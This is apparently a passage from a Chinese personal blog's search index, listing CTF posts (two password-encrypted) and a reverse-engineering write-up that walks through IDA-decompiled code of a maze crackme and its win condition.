<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>buuctf-pwn</title>
      <link href="2021/10/28/buuctf-pwn/"/>
      <url>2021/10/28/buuctf-pwn/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu使用记录</title>
      <link href="2021/10/25/Ubuntu%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
      <url>2021/10/25/Ubuntu%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="0185247131ae8e418acc25c4ee4d09cd1738d8e0b7b3945a77a392139a9e9840">22064b17c03cb0c0e58c99349b6889d0e918231d1b5b54fbbe954408a3cd5f3fe807b4e04d7a727a47a6c35d51098926f47106adb471d3cd74fc62cdcab45ab047542d7ac503c40f7aa97bccc74f927fc0c42fcbab9e13177304b8a8dce565ab5e3ae6f8924bfc40e973195abafc4fd825c7ea04f6eea07cf7891c141ad7c67095eede65a94c2663e27e21d6ea3480c9405399058e6e92d7378c4c33cfbddc4e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Ubuntu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux-Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn的学习记录</title>
      <link href="2021/10/25/pwn%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>2021/10/25/pwn%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b9a64444c32ed8b726ca2d658382e0b243f0d39ce301c3bd36db4a6216378eaf"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-pwn-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfwiki-re</title>
      <link href="2021/10/08/ctfwiki-re/"/>
      <url>2021/10/08/ctfwiki-re/</url>
      
        <content type="html"><![CDATA[<h1 id="Reverse-100"><a href="#Reverse-100" class="headerlink" title="Reverse 100"></a>Reverse 100</h1><p>64位程序，无壳，拖入ida中反编译<br>查看main函数，可猜出本题为迷宫</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400720</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  __int64 v15; <span class="comment">// rax</span></span><br><span class="line">  __int64 v16; <span class="comment">// rax</span></span><br><span class="line">  __int64 v17; <span class="comment">// rax</span></span><br><span class="line">  __int64 v18; <span class="comment">// rax</span></span><br><span class="line">  __int64 v19; <span class="comment">// rax</span></span><br><span class="line">  __int64 v20; <span class="comment">// rax</span></span><br><span class="line">  __int64 v21; <span class="comment">// rax</span></span><br><span class="line">  __int64 v22; <span class="comment">// rax</span></span><br><span class="line">  __int64 v23; <span class="comment">// rax</span></span><br><span class="line">  __int64 v24; <span class="comment">// rax</span></span><br><span class="line">  __int64 v25; <span class="comment">// rax</span></span><br><span class="line">  __int64 v26; <span class="comment">// rax</span></span><br><span class="line">  __int64 v27; <span class="comment">// rax</span></span><br><span class="line">  __int64 v28; <span class="comment">// rax</span></span><br><span class="line">  __int64 v29; <span class="comment">// rax</span></span><br><span class="line">  __int64 v30; <span class="comment">// rax</span></span><br><span class="line">  __int64 v31; <span class="comment">// rax</span></span><br><span class="line">  __int64 v32; <span class="comment">// rax</span></span><br><span class="line">  __int64 v33; <span class="comment">// rax</span></span><br><span class="line">  __int64 v34; <span class="comment">// rax</span></span><br><span class="line">  __int64 v35; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *v36; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v37; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v38; <span class="comment">// er12</span></span><br><span class="line">  _QWORD *v39; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v40; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v41; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v42; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v43; <span class="comment">// rax</span></span><br><span class="line">  __int64 v44; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v45; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v47[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v48; <span class="comment">// [rsp+2Ch] [rbp-A4h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v49; <span class="comment">// [rsp+2Dh] [rbp-A3h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v50; <span class="comment">// [rsp+2Eh] [rbp-A2h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v51; <span class="comment">// [rsp+2Fh] [rbp-A1h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v52; <span class="comment">// [rsp+30h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v53; <span class="comment">// [rsp+34h] [rbp-9Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v54; <span class="comment">// [rsp+38h] [rbp-98h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v55; <span class="comment">// [rsp+3Ch] [rbp-94h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v56; <span class="comment">// [rsp+40h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v57; <span class="comment">// [rsp+44h] [rbp-8Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v58; <span class="comment">// [rsp+48h] [rbp-88h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v59; <span class="comment">// [rsp+4Ch] [rbp-84h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v60; <span class="comment">// [rsp+50h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v61; <span class="comment">// [rsp+54h] [rbp-7Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v62; <span class="comment">// [rsp+58h] [rbp-78h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v63; <span class="comment">// [rsp+5Ch] [rbp-74h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v64; <span class="comment">// [rsp+60h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v65; <span class="comment">// [rsp+64h] [rbp-6Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v66; <span class="comment">// [rsp+68h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v67; <span class="comment">// [rsp+6Ch] [rbp-64h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v68; <span class="comment">// [rsp+70h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v69; <span class="comment">// [rsp+74h] [rbp-5Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v70; <span class="comment">// [rsp+78h] [rbp-58h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v71; <span class="comment">// [rsp+7Ch] [rbp-54h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v72; <span class="comment">// [rsp+80h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v73; <span class="comment">// [rsp+84h] [rbp-4Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v74; <span class="comment">// [rsp+88h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v75; <span class="comment">// [rsp+8Ch] [rbp-44h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v76; <span class="comment">// [rsp+90h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v77; <span class="comment">// [rsp+94h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v78; <span class="comment">// [rsp+98h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v79; <span class="comment">// [rsp+9Ch] [rbp-34h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v80; <span class="comment">// [rsp+A0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v81; <span class="comment">// [rsp+A4h] [rbp-2Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v82; <span class="comment">// [rsp+A8h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v83; <span class="comment">// [rsp+ACh] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v84; <span class="comment">// [rsp+B0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v85; <span class="comment">// [rsp+B4h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v86; <span class="comment">// [rsp+B8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v87; <span class="comment">// [rsp+BFh] [rbp-11h]</span></span><br><span class="line"></span><br><span class="line">  v87 = <span class="number">1</span>;</span><br><span class="line">  sub_40129E(&amp;v49);</span><br><span class="line">  sub_401338(v47, <span class="number">11L</span>L, &amp;v51, &amp;v50, &amp;v49);</span><br><span class="line">  sub_4012B8(&amp;v49);</span><br><span class="line">  v52 = <span class="number">0</span>;</span><br><span class="line">  v0 = sub_4013D0(v47, &amp;v52);                  </span><br><span class="line">  sub_440CE0(v0, <span class="string">&quot;**########################################################################################&quot;</span>);</span><br><span class="line">  v53 = <span class="number">10</span>;</span><br><span class="line">  v1 = sub_4013D0(v47, &amp;v53);                  </span><br><span class="line">  sub_440CE0(v1, <span class="string">&quot;#************######*##############**************##*####*#######*##*##*###*#####*####*#####&quot;</span>);</span><br><span class="line">  v54 = <span class="number">22</span>;</span><br><span class="line">  v2 = sub_4013D0(v47, &amp;v54);                   </span><br><span class="line">  sub_440CE0(v2, <span class="string">&quot;###*#########*****************************************************************############&quot;</span>);</span><br><span class="line">  v55 = <span class="number">24</span>;</span><br><span class="line">  v3 = sub_4013D0(v47, &amp;v55);                  </span><br><span class="line">  sub_440CE0(v3, <span class="string">&quot;###*#########*###############################################*######*****************#####&quot;</span>);</span><br><span class="line">  v56 = <span class="number">21</span>;</span><br><span class="line">  v4 = sub_4013D0(v47, &amp;v56);                  </span><br><span class="line">  sub_440CE0(v4, <span class="string">&quot;###**********#############################################################################&quot;</span>);</span><br><span class="line">  v57 = <span class="number">1</span>;</span><br><span class="line">  v5 = sub_4013D0(v47, &amp;v57);                </span><br><span class="line">  sub_440CE0(v5, <span class="string">&quot;#*######################*******************************************#####*************#####&quot;</span>);</span><br><span class="line">  v58 = <span class="number">20</span>;</span><br><span class="line">  v6 = sub_4013D0(v47, &amp;v58);                </span><br><span class="line">  sub_440CE0(v6, <span class="string">&quot;############*#####*******************************************************************#####&quot;</span>);</span><br><span class="line">  v59 = <span class="number">15</span>;</span><br><span class="line">  v7 = sub_4013D0(v47, &amp;v59);                  </span><br><span class="line">  sub_440CE0(v7, <span class="string">&quot;###*#################################################*#########*##*######*#####*####*#####&quot;</span>);</span><br><span class="line">  v60 = <span class="number">16</span>;</span><br><span class="line">  v8 = sub_4013D0(v47, &amp;v60);               </span><br><span class="line">  sub_440CE0(v8, <span class="string">&quot;###*####*****#####**********************#############*#########*##********#####*####*#####&quot;</span>);</span><br><span class="line">  v61 = <span class="number">2</span>;</span><br><span class="line">  v9 = sub_4013D0(v47, &amp;v61);            </span><br><span class="line">  sub_440CE0(v9, <span class="string">&quot;#************************####*####################################*#####*###########*#####&quot;</span>);</span><br><span class="line">  v62 = <span class="number">18</span>;</span><br><span class="line">  v10 = sub_4013D0(v47, &amp;v62);         </span><br><span class="line">  sub_440CE0(v10, <span class="string">&quot;###*####*###*#####*############################################*****************####*#####&quot;</span>);</span><br><span class="line">  v63 = <span class="number">17</span>;</span><br><span class="line">  v11 = sub_4013D0(v47, &amp;v63);                 </span><br><span class="line">  sub_440CE0(v11, <span class="string">&quot;###*####*###*#####*####################***************#########*###############*####*#####&quot;</span>);</span><br><span class="line">  v64 = <span class="number">3</span>;</span><br><span class="line">  v12 = sub_4013D0(v47, &amp;v64);                 </span><br><span class="line">  sub_440CE0(v12, <span class="string">&quot;#########*#########*#########*#######***************************##*#####*###########*#####&quot;</span>);</span><br><span class="line">  v65 = <span class="number">26</span>;</span><br><span class="line">  v13 = sub_4013D0(v47, &amp;v65);          </span><br><span class="line">  sub_440CE0(v13, <span class="string">&quot;#############################################################*######*#####################&quot;</span>);</span><br><span class="line">  v66 = <span class="number">4</span>;</span><br><span class="line">  v14 = sub_4013D0(v47, &amp;v66);               </span><br><span class="line">  sub_440CE0(v14, <span class="string">&quot;#******##*#########*#########*#######*#########################*##*#####*###########*#####&quot;</span>);</span><br><span class="line">  v67 = <span class="number">5</span>;</span><br><span class="line">  v15 = sub_4013D0(v47, &amp;v67);                </span><br><span class="line">  sub_440CE0(v15, <span class="string">&quot;#*####*##*#########*#########*#######*#########################*##*#####********####*#####&quot;</span>);</span><br><span class="line">  v68 = <span class="number">19</span>;</span><br><span class="line">  v16 = sub_4013D0(v47, &amp;v68);                  </span><br><span class="line">  sub_440CE0(v16, <span class="string">&quot;###******###*#####*#################################################################*#####&quot;</span>);</span><br><span class="line">  v69 = <span class="number">23</span>;</span><br><span class="line">  v17 = sub_4013D0(v47, &amp;v69);                  </span><br><span class="line">  sub_440CE0(v17, <span class="string">&quot;###*#########*###############################################*############################&quot;</span>);</span><br><span class="line">  v70 = <span class="number">6</span>;</span><br><span class="line">  v18 = sub_4013D0(v47, &amp;v70);                  </span><br><span class="line">  sub_440CE0(v18, <span class="string">&quot;#*####*##*#########*######*******####*###**********####****####*##*############*####*#####&quot;</span>);</span><br><span class="line">  v71 = <span class="number">7</span>;</span><br><span class="line">  v19 = sub_4013D0(v47, &amp;v71);                 </span><br><span class="line">  sub_440CE0(v19, <span class="string">&quot;#*##***#**#########*#################*###*########*####*#######*##*############*####*#####&quot;</span>);</span><br><span class="line">  v72 = <span class="number">25</span>;</span><br><span class="line">  v20 = sub_4013D0(v47, &amp;v72);             </span><br><span class="line">  sub_440CE0(v20, <span class="string">&quot;###**************************************************########*######*#####################&quot;</span>);</span><br><span class="line">  v73 = <span class="number">8</span>;</span><br><span class="line">  v21 = sub_4013D0(v47, &amp;v73);                 </span><br><span class="line">  sub_440CE0(v21, <span class="string">&quot;#*##*###*##########*##############****###*******##*####*#######*##*##*****#####*####*#####&quot;</span>);</span><br><span class="line">  v74 = <span class="number">9</span>;</span><br><span class="line">  v22 = sub_4013D0(v47, &amp;v74);             </span><br><span class="line">  sub_440CE0(v22, <span class="string">&quot;#*##*###*##########*##############*############*##*####*#######*##*##*###*#####*####*#####&quot;</span>);</span><br><span class="line">  v75 = <span class="number">11</span>;</span><br><span class="line">  v23 = sub_4013D0(v47, &amp;v75);              </span><br><span class="line">  sub_440CE0(v23, <span class="string">&quot;###################*##############################*####***#####*##*##*###*#####*####*#####&quot;</span>);</span><br><span class="line">  v76 = <span class="number">12</span>;</span><br><span class="line">  v24 = sub_4013D0(v47, &amp;v76);                </span><br><span class="line">  sub_440CE0(v24, <span class="string">&quot;###################********************************############*##*##*###*#####*####*#####&quot;</span>);</span><br><span class="line">  v77 = <span class="number">13</span>;</span><br><span class="line">  v25 = sub_4013D0(v47, &amp;v77);                  </span><br><span class="line">  sub_440CE0(v25, <span class="string">&quot;###############################################################*##*##*###*#####*####*#####&quot;</span>);</span><br><span class="line">  v78 = <span class="number">28</span>;</span><br><span class="line">  v26 = sub_4013D0(v47, &amp;v78);              </span><br><span class="line">  sub_440CE0(v26, <span class="string">&quot;#########################*****************************************************************&quot;</span>);</span><br><span class="line">  v79 = <span class="number">14</span>;</span><br><span class="line">  v27 = sub_4013D0(v47, &amp;v79);           </span><br><span class="line">  sub_440CE0(v27, <span class="string">&quot;###***************************************************#########*##*##*###*#####*####*#####&quot;</span>);</span><br><span class="line">  v80 = <span class="number">27</span>;</span><br><span class="line">  v28 = sub_4013D0(v47, &amp;v80);                  </span><br><span class="line">  sub_440CE0(v28, <span class="string">&quot;#############################################################*######*#####################&quot;</span>);</span><br><span class="line">  v81 = <span class="number">29</span>;</span><br><span class="line">  v29 = sub_4013D0(v47, &amp;v81);                  </span><br><span class="line">  sub_440CE0(v29, <span class="string">&quot;#*#######*####**###*#######***#######*########**###*******##*****##########################&quot;</span>);</span><br><span class="line">  v82 = <span class="number">30</span>;</span><br><span class="line">  v30 = sub_4013D0(v47, &amp;v82);                  </span><br><span class="line">  sub_440CE0(v30, <span class="string">&quot;##*#####*###*###*##*######*#########*#*######*##*#####*#####*##############################&quot;</span>);</span><br><span class="line">  v83 = <span class="number">31</span>;</span><br><span class="line">  v31 = sub_4013D0(v47, &amp;v83);                  </span><br><span class="line">  sub_440CE0(v31, <span class="string">&quot;###*###*####*###*##*######*##**####*###*####*#########*#####***############################&quot;</span>);</span><br><span class="line">  v84 = <span class="number">32</span>;</span><br><span class="line">  v32 = sub_4013D0(v47, &amp;v84);                  </span><br><span class="line">  sub_440CE0(v32, <span class="string">&quot;####*#*#####*###*##*##*###*###*###*******####*##*#####*#####*##############################&quot;</span>);</span><br><span class="line">  v85 = <span class="number">33</span>;</span><br><span class="line">  v33 = sub_4013D0(v47, &amp;v85);                  </span><br><span class="line">  sub_440CE0(v33, <span class="string">&quot;#####*#######**####****####**####*#######*####**######*#####*##############################&quot;</span>);</span><br><span class="line">  v86 = <span class="number">0</span>;</span><br><span class="line">  v34 = sub_4013D0(v47, &amp;v86);</span><br><span class="line">  v35 = sub_43F820(v34);</span><br><span class="line">  v36 = sub_407C60(qword_73EFA0, v35);</span><br><span class="line">  sub_407610(v36, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( v87 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_420230(&amp;unk_73F0C0, &amp;v48);</span><br><span class="line">    <span class="keyword">if</span> ( v48 == <span class="string">&#x27;L&#x27;</span> )                           <span class="comment">// 左移</span></span><br><span class="line">    &#123;</span><br><span class="line">      --x;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v48 &gt; <span class="string">&#x27;L&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v48 == <span class="string">&#x27;R&#x27;</span> )                         <span class="comment">// 右移</span></span><br><span class="line">      &#123;</span><br><span class="line">        ++x;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v48 == <span class="string">&#x27;U&#x27;</span> )                         <span class="comment">// 上移</span></span><br><span class="line">      &#123;</span><br><span class="line">        --y;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v48 == <span class="string">&#x27;D&#x27;</span> )                      <span class="comment">// 下移</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++y;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">    v87 = <span class="number">0</span>;</span><br><span class="line">LABEL_14:</span><br><span class="line">    v37 = y;</span><br><span class="line">    v38 = x;</span><br><span class="line">    v39 = sub_407670(qword_73EFA0, v48);</span><br><span class="line">    v40 = sub_407610(v39, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    v41 = sub_4079B0(v40, v38);</span><br><span class="line">    v42 = sub_407610(v41, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    v43 = sub_4079B0(v42, v37);</span><br><span class="line">    sub_407610(v43, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( x == <span class="number">89</span> &amp;&amp; y == <span class="number">28</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_407610(qword_73EFA0, <span class="string">&quot;WIN\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( x &gt;= <span class="number">0</span> &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; x &lt;= <span class="number">89</span> &amp;&amp; y &lt;= <span class="number">28</span> )<span class="comment">// 坐标（89，28）</span></span><br><span class="line">    &#123;</span><br><span class="line">      v44 = x;</span><br><span class="line">      v45 = sub_4013D0(v47, &amp;y);</span><br><span class="line">      <span class="keyword">if</span> ( *sub_4412E0(v45, v44) != <span class="string">&#x27;#&#x27;</span> )       <span class="comment">// 不能碰到#</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_407610(qword_73EFA0, <span class="string">&quot;FAIL\n&quot;</span>);</span><br><span class="line">LABEL_24:</span><br><span class="line">  sub_4013B6(v47);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的迷宫为乱序排序，可根据迷宫上面的数字排列出正常顺序，需排到29行即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 